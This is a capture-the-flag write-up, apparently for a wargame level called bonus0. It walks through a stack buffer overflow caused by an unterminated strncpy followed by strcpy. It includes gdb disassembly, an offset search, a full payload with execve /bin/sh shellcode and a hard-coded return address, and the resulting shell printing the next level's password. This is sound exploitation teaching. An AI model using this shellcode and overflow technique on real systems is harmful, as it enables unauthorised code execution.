## bonus0
In `bonus0` we will find three functions`p() pp() main()`<br>
The `main()` will set the stack to `sub    esp,0x40` and will create a *__buffer[42]__* `( eax,[esp+0x16])` and after that `main()` will call a function called `pp(buffer)` and will pass this *buffer[42]* as parameter.<br>
The function `pp()` will create two buffers also that we will call *str1 & str2*
```
0x0804852e <+16>:	lea    eax,[ebp-0x30]
0x08048541 <+35>:	lea    eax,[ebp-0x1c]
```
Pay special attention to the gap between those two __addresses__

|0x30 - 0x1c = 0x14|
|-|
|Those `0x14 (20) bytes` is where the exploit will be made|

Following there will be two call to a funtion called `p()`, this function takes in two parameters `p(param1, param2)` the first parameter will will be the *str1* in the first call and *str2* on the second call, and the second parameter in both calls will be the string <br> `" - "`

|p(str1, " - ")|
|-|
|p(str2, " - ")|

The function `p()` will call `puts()` on her second argument and define a buffer of 4096 <br> ` 0x080484c8 <+20>:	mov    DWORD PTR [esp+0x8],0x1000` <br>
again pay attention here because in this buffer we will have to store our *shellcode* <br>
After that a call to `read()` will be made for getting an input from the user, this input will be stored in this *buffer[4096]* that is being stored at
```
=> 0x080484d0 <+28>:	lea    eax,[ebp-0x1008]

(gdb) x/x $ebp-0x1008
0xbfffe640:	0x00000000  <-- Kid pay attention to this address, it's gold :p
```
Just after the read we will find the *exploit*, there will be a call to *strchr(buffer, 0xa)* this value is 10 and in the ascii table represents the `\n` and after finding this character *(probably when we hit enter after entering the input in the keyboard)* the program will place at the __address__ returned by `strchr()` the `\0` NULL end of string. <br>
Next a call to `strncpy()` is made to copy `20 bytes` from the *buffer[4096]* to the first parameter passed to `p(str1, " - ")` and this *str1* from function `pp()` is only `20 bytes` behind the second *str2* that will be passed on the second call to `p()`, so if there is no `\0` in the *str1* it will go over the *str2* and when the function `strcpy()` is called in function `pp()` with this *str1* to be copied to the string passed to `pp(bufferFromMain())` as a parameter from `main()` that is only `42 bytes` long, if the string is large enough it will overwrote the __address__ `eip` is pointing to in `main()`  

After some tests we find our *offset* as a value of `9`
```
-
AAAAAAAAAAAAAAAAAAAA
-
BBBBBBBBBBCCCCCCCCCC
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBCCCCCCCCCC�� BBBBBBBBBBCCCCCCCCCC��  <-- here with 10 B we still have one 42 at the address
0x43434342 in ?? () <-- the last 42 it's the 10th B

-
AAAAAAAAAAAAAAAAAAAA
-
BBBBBBBBBCCCCCCCCCCC
AAAAAAAAAAAAAAAAAAAABBBBBBBBBCCCCCCCCCCC�� BBBBBBBBBCCCCCCCCCCC�� <-- here with 9 B the address of the $eip is set to 0x43434343 that is the C
0x43434343 in ?? () <-- offset equal 9

(gdb) i r
eax            0x0	0
ecx            0xffffffff	-1
edx            0xb7fd28b8	-1208145736
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff700	0xbffff700
ebp            0x42424242	0x42424242
esi            0x0	0
edi            0x0	0
eip            0x43434343	0x43434343    <--- the eip is overwrote, here we need to put the address of the buffer[0x100] with our shellcode
eflags         0x200286	[ PF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```
The idea here is to put our *shellcode* from `leve2` as the first parameter *(here we need to write at least 20 random characters to pass the `strncpy(20)` function and allow us to write more in the buffer and overflow the eip, to make the buffer without the `\0` )* and with the *offset* we found above we pass 9 random character plus an address somewhere where our first string is stored, here I choose *0xbfffe680* that is 64 bytes from the start of our buffer *0xbfffe640* remember from the stack on main ?<br>
`0x080485aa <+6>:	sub    esp,0x40` <br>
This is exactly `64 bytes` and that's the way we overwrote the eip to call our *shellcode* stored at __address__ *0xbfffe640*
Here is the payload
```
(python -c "print('A' * 42 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80')"; python -c "print('B' * 9 + '\x80\xe6\xff\xbf' + 'C' * 7)"; cat) | ./bonus0

 -
 -
AAAAAAAAAAAAAAAAAAAABBBBBBBBB����CCCCCCC�� BBBBBBBBB����CCCCCCC��
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
